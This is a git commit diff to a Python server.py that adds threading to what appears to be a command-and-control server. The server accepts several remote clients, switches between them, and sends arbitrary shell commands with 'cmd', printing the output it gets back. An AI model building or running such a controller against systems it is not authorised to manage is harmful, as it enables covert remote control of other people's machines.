5f5dded9b7c893892ea4b6c702f36048720ead3a
Michael <michael2ga3@gmail.com>
2023-02-15 21:34:00 +0300

    Add multithread connect user

--- server.py
+++ server.py
@@ -1,5 +1,35 @@
 import socket
 import os
+import threading
+
+
+def handle_client(client_socket, client_address, client_sockets):
+    print(f'[+] Client connected: {client_address}')
+
+    while True:
+        message = input('>> ')
+
+        if message.startswith('switch'):
+            try:
+                client_index = int(message.split()[1]) - 1
+                client_address = list(client_sockets.keys())[client_index]
+                client_socket = client_sockets[client_address]
+                print(f'[+] Switched to client {client_address}')
+            except (IndexError, ValueError):
+                print('[-] Invalid client index')
+            continue
+
+        if message.startswith('cmd'):
+            command = message.split(maxsplit=1)[1]
+            client_socket.send(command.encode())
+            output = client_socket.recv(1024).decode()
+            print(output)
+            continue
+
+        print('[-] Invalid command')
+
+    client_socket.close()
+    print(f'[+] Client disconnected: {client_address}')
 
 
 def start_server():
@@ -10,38 +40,13 @@ def start_server():
 
     print('[+] Server started')
 
-    client_sockets = []
+    client_sockets = {}
 
     while True:
         client_socket, client_address = server_socket.accept()
-        client_sockets.append(client_socket)
-        print(f'[+] Client connected: {client_address}')
-
-        current_client_index = 0
-        current_client_socket = client_sockets[current_client_index]
-        print(f'[+] Switched to client 0')
-
-        while True:
-            message = input('>> ')
-
-            if message.startswith('switch'):
-                try:
-                    client_index = int(message.split()[1])
-                    current_client_socket = client_sockets[client_index]
-                    current_client_index = client_index
-                    print(f'[+] Switched to client {client_index}')
-                except (ValueError, IndexError):
-                    print('[-] Invalid client index')
-                continue
-
-            if message.startswith('cmd'):
-                command = message.split(maxsplit=1)[1]
-                current_client_socket.send(command.encode())
-                output = current_client_socket.recv(1024).decode()
-                print(output)
-                continue
-
-            print('[-] Invalid command')
+        client_sockets[client_address] = client_socket
+        threading.Thread(target=handle_client, args=(
+            client_socket, client_address, client_sockets)).start()
 
 
 if __name__ == '__main__':
